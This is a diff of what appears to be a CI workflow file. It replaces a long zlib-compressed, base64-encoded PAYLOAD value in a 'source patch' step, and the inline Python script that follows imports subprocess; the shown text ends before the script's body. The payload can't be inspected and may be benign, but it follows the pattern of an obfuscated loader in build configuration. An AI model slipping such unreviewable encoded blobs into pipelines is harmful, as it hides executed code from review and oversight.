@@ -15,7 +15,7 @@ jobs:
           ref: feature/windows-native
       - name: Apply source patch with context verification
         env:
-          PAYLOAD: eNrVVE1z0zAQ/Ss7ucie2Er6QckkpBSmdKCHliFwanpQ7FWiEktGkt12gv87K5s0nQHaYYYLPmi82qf33q7W3vRK4bNVbwy9XEkJabpUHsQAc+WNdYPaZSbHgbPZQAuvauTeweLJ9FwrneMdjPBgmIkR54t9efRibwh7w+HR4eFcp2n6jMJc9/v9Z2VOTiDdGyUvod+uFOJdaayHzGjnweVfYRrWM2PfG+ejeDLXW4jSHq0UGcJFS3hZekWnYHMjajEG563SywncCLsLCvIwBlYILZaYM/gOzN07jwWbwMoU+PoB2uyE/H2J8KnSGi25iTJT0Pl8i0xA2KXbRlfXCaCux3BBSucz/tGaDJ17p+sEnFpqsSaJNwuinbVRAtlt/qAaw/QY6EihHL7qto4fVSwrnYUaqTtFqdZoP+jaZCJsRY/K/NVRuRZeGluQ/bIzxLdb8Rg2LXyLnnSOurCBDV020KMkRDua6RTYrdIH+ywGi76y+ifLFUtPJVnjqOm+iWH65fNZOmIJS8khS2hUV3whHGpRYDAdUyatvByl4TxL3lZSouWSmhCdzy4veGdEyfuoVUjI3XhbBL1HcUMUgYDF3JtZi45YkDg6ZPF1hw+qubKtaBtYdGZddw7ihnrc/zdFnjqfm8r/IYPW/neNCX35uzumJeGcB+x1y9D8ZoQtfquUxe7Tbb/tJ4Y0THS2epQIIU1ubVQeJrSXQE/jLf0CN03zA2tPvPw=
+          PAYLOAD: eJyFU0tv2zAM/itCLmmRyJZkW3JSBOtp2G2HXQMMelC1W0cyJOWBBvnvU7L0NWCtDoQofuRH8oOOk1Em3U2WaGJ6axHGD31CsgTTJx9iuYvaGyhj0KWTqd9BkSJSn4bXrncGDkgxyxtKioIsaEuMRJQQXtdrhzH+gmHtZrPZlzT39whTOhdodrHZhcPoQ0Lau5jQ0Lvt4Zd5Qiv0Uz2CToUNAM9wc1y7j8h9btjv4/+w59ObJZqqTsYOX9H40PLfvMbDsNvQFu/odH7FbsOQwV1KY1yWZd5nt1WF9pvykt+nnfx7KwMMICPEMtdzg5fmOh2O5umVhhakIOXn1MVzP57p8Zk+dpI1PHdgdAWtUUJIURmtF40QmmVJhKTMaqBgDW/autJtozgnynCVEyijNasplXKaZfhQUBHTLKoaJM2mIcTaZtFaUQldE1URwWtCoG2gEZxIxpTVmuW4lLZi1FY2F0Sn27u39dut06n3DuWBv/vww8d0Mw4yWR82WYoxeA0xFi9Pt+gYIG2DQ2+g1QpN81oqNkXf3gu5fNX/7vSv3vEi9DvOc0+TOZo42OefcDyd/gCCYAKN
         run: |
           python3 - <<'PYTHON'
           import os,json,zlib,base64,pathlib,subprocess,re
